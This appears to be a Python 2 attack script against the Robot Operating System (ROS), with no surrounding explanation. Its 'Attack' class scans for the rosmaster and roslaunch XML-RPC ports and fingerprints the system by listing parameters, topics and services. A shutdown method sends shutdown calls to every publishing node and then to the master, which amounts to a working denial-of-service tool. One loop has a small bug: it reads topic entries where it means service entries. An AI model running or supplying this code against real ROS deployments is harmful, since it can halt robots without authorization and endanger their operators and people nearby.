try:
    from xmlrpc.client import ServerProxy
except ImportError:
	from xmlrpclib import ServerProxy

class Attack:
	def __init__(self):
		print "[*]attack class"

	def PortScanning(self, ip='127.0.0.1'):
		#stage1 roscore open check
		print "[*]port scanning"
		port = 11311
		first_find = True
		while True:
			try:
				self.proxy = ServerProxy("http://"+ip+":"+str(port)+"/")
				rosmaster_pid = self.proxy.getPid("")[2]
				break
			except:
				if (port == 11312) and (first_find):
					port = 1
					first_find = False
				else:
					port += 1
				continue

		print "[*]rosmaster XmlRpcServer pid: %d, port: %d" %(rosmaster_pid, port)
		
		#stage2 roslaunch xmlrpc server port checking
		port = 10000
		while True:
			try:
				self.launch_proxy = ServerProxy("http://"+ip+":"+str(port)+"/")
				roslaunch_pid = self.launch_proxy.get_pid()[2]
				break
			except:
				port += 1
				continue

		print "[*]roslaunch XmlRpcServer pid: %d, port: %d" %(roslaunch_pid, port)

	def FingerPrinting(self):
		print "[*]finger printing"
		#####stage 1 fingerprinting from rosmaster xmlrpcServer
		self.GetParameter()
		#####stage 2 Get publishers, subscribers, services
		self.GetSystemState()

	def GetParameter(self):
		print "[*]---Parameter Names---"
		for i, param in enumerate(self.proxy.getParamNames("")[2]):
			print "%d: %s" %(i, param)

	def GetSystemState(self):
		print "[*]---SystemState---"
		publishers, subscribers, services = self.proxy.getSystemState("")[2]
		print "[*]publishers"
		for i, topic in enumerate(publishers):
			print "[%d]topic: %s" %(i,topic[0])
			print "->publisher"
			for topicPublisher in topic[1]:
				print topicPublisher

		print "[*]subscribers"
		for i, topic in enumerate(subscribers):
			print "[%d]topic: %s" %(i, topic[0])
			print "->TopicSubscriber"
			for topicSubscriber in topic[1]:
				print topicSubscriber

		print "[*]service"
		for i, service in enumerate(services):
			print "[%d]service: %s" %(i, service[0])
			print "->serviceProvider"
			for serviceProvider in topic[1]:
				print serviceProvider

	def ReplayAttack(self):
		print "[*]replay attack"

	def shutdown(self):
		#stage1 turn off nodes
		publishers, subscribers, services = self.proxy.getSystemState("")[2]
		node = []
		for topic in publishers:
			for topicPublisher in topic[1]:
				node.append(topicPublisher)
		
		print node
		node = list(set(node))
		for tmp in node:
			#lookup node
			apiUri = self.proxy.lookupNode(tmp,tmp)[2]
			NodeProxy = ServerProxy(apiUri)
			NodeProxy.shutdown("")

		#stage2 turn off master
		print "[*]turn off ros"
		self.proxy.shutdown("","")
